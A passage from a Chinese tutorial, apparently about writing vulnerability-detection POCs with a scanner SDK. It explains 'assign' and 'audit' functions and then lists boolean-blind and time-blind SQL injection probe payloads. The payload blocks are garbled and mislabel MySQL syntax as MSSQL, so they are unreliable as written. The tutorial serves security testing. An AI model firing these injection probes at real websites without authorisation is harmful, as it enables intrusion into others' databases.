那么有人有疑问了，为什么要用到两个函数。  

### **assign函数**

事实上，SDK中封装了两个基本函数，assign函数在判断完传入的服务类型之后，会传入arg到审计函数audit中。

assign存在的意义就在于可以避免不必要的测试。比如你期望用dedecms的poc去验证wordpress的站点，明显是不合理的。

### audit函数

这个函数是审计函数，漏洞检测的发送已经响应报文是这个函数体现的。如果逻辑较为复杂，大家可以自行封装方法，最后在audit函数调用即可。

就如POC中那样，最后构造的select查询语句在audit中体现。

那么有人问了，如果遇到其他的数据库该怎么构造。

### 布尔盲注构造

这一类的注入在返回页面中没有回显，但可以根据返回页面的结果判断构造的SQL条件语句的真假性。

```


MSSQL 数据库select \* from xxxx where id\=xxx and 1\=1
;select \* from xxxx where id\=xxx and 1\=2
;SELECT 123 ELSE DROP FUNCTION

 xxxx;SELECT (CASE WHEN (1\=1) THEN 123 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM

 DUAL)select \* from table where 1\=1
;select \* from table where 1\=2
;select \* from table where 1\>2
;select IF(1\=1, 1, 2
);select IF(1\=2, 1, 2
);select IF('a'\='a', 1, 2
);
```

### 时间盲注构造

这一类的注入在返回页面中没有回显，但可以根据返回页面的结果判断构造的SQL条件语句的真假性。当天如果为了提高准确率，可以将结果保存，多测试几次。

```


MSSQL 数据库SELECT IF(1\=1, sleep(5), "1"
);SELECT IF(1\=2, sleep(5), "1"
);
```
